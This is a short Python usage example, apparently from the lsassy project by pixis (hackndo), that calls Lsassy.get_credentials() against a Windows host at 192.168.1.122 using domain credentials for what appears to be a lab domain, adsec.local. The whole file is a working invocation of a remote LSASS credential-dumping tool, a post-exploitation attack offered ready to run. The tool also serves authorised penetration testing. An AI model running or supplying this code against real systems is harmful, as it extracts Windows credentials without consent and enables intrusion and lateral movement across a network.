# Author:
#  Romain Bentz (pixis - @hackanddo)
# Website:
#  https://beta.hackndo.com

from lsassy.core import Lsassy

lsassy = Lsassy(hostname="192.168.1.122", username="jsnow", domain="adsec.local", password="Winter_is_coming_!")
print(lsassy.get_credentials())